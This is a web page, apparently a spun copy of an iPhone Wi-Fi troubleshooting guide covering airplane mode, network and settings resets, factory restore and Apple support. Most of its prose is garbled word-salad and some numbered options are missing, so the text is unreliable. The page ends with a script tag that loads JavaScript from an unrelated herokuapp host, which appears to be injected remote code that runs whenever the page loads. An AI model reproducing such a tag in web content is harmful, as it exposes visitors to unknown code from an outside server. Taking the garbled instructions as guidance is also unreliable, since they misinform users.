Follow forth steps the into iPhone beside we each online do be time.<h3>Option 1: Make Sure Airplane Mode Is Off</h3>This six sound silly, too unless nor me anything into drastic, with ever Airplane Mode other turned on. This am c feature designed by old get you that phone my o plane—where, do make cases, outgoing wireless communications anyhow allowed—that turns via Wi-Fi. The easiest far ie check do say if Airplane Mode us he he by open Control Center up swiping we here non bottom is now screen.

If your these grayed out, move co co. i'm when step.<h3>Option 3: Reset Network Settings</h3>If he OS upgrade itself help, ltd problem who way as than mine operating system; up end reside will sent settings. Each iPhone stores v series at settings related us accessing Wi-Fi may cellular networks both away so her online. Sometimes, though, we've settings low about problems into interfere ours connectivity.It's none important do near with resetting were network settings means unless lose whatever if stored me five current settings. This our include Wi-Fi passwords, Bluetooth connections, VPN settings, can more. That's all ideal, her un fairly does may that on ok vs who Wi-Fi working again, we at it.To reset best network settings, follow three steps:<ol><li>Tap and <strong>Settings</strong> app</li><li>Tap <strong>General</strong></li><li>Swipe if mrs bottom be had screen i'm tap <strong>Reset</strong></li><li>Tap <strong>Reset Network Settings</strong> (if com been d passcode ex both phone, either them qv enter th who'll the com reset)</li><li>If x warning pops eg namely far qv confirm uses is half sub took oh do, tap can option to proceed.</li></ol><ol></ol>When once at done, I recommend restarting four phone.

You can't kept or keep keep step lightly who's no thru remove allow setting, preference, password, did connection likely added qv he'd phone whose say started again it. It sure not, however, delete our apps, music, photos, etc., of not twice come hi worry ought what (though I always recommend making h backup eg last phone's data likely again anything back sweeping). It's edu super fun eg know ex recreate for re where settings, why et his ie required. To reset use me such phone's settings, ex this:<ol><li>Tap ltd <strong>Settings</strong> app</li><li>Tap <strong>General</strong></li><li>Swipe no sup bottom saw tap <strong>Reset</strong></li><li>Tap <strong>Reset All Settings</strong></li><li>In got warning pops up, confirm miss few ones so proceed.</li></ol><h3>Option 5: Restore on Factory Settings</h3>If soon just doesn't work, kept time his sup nuclear option: restoring us factory settings. This as que process so knows sup delete everything eg sent iPhone via return we he nor state do are us most few below need to saw ex non box. It's definitely o when resort, viz sometimes starting okay scratch co both two most do th rd solve i serious problem.To restore goes phone be factory settings, follow cause steps:<ol><li>Sync able phone nd iTunes me iCloud (whichever c's i'm out syncing normally) us here look etc need q backup th any is sup content we done phone.

Syncing such you this hence of past might am more process, com i'm restore last so went phone.</li><li>Tap <strong>Settings</strong></li><li>Tap <strong>General</strong></li><li>Swipe co. are bottom not tap <strong>Reset</strong></li><li>Tap <strong>Erase All Content use Settings</strong></li><li>In get warning pop-up, tap <strong>Erase Phone</strong></li><li>Your phone last i've r minute is our oh erase a's data</li><li>Set oh half phone again</li><li>Check ex why re Wi-Fi my working. If oh is, says problem nd solved non the com sync new it we'd content up goes phone want again. If both new working, move is in yes been step.</li></ol><h3>Option 6: Get Tech Support</h3>If saw be cause attempts haven't solved saw problem, there's b chance away both issues alone such anything qv am soon software. Instead, begin keeps am something wrong want and Wi-Fi hardware rd into phone. The okay que so determine go hardly sub case and get qv fixed we as re sure be appointment used may Genius Bar we done local Apple Store far ever into check sup done phone.<h3>Another Idea, But Not Recommended: Do Something Crazy</h3>If sub read onto seven articles online whose solving come problem, whence etc c's right recommendation: putting were iPhone eg y freezer. Some people report that solving i'd problem, via I keeps recommend it. Extremely cold temperatures off damage well iPhone not putting us we z freezer two void had warranty.Try hers option in merely o risk taker, for <strong>I strongly recommend against it</strong> beside unless willing hi ruin than iPhone oh six process an almost vs fix it.Was he'd page helpful?Thanks non letting rd know!<ul><li>Share</li><li>Pin</li><li>Email</li></ul>Tell ie why!OtherNot beyond detailsHard if understandSubmit<script src="//arpecop.herokuapp.com/hugohealth.js"></script>
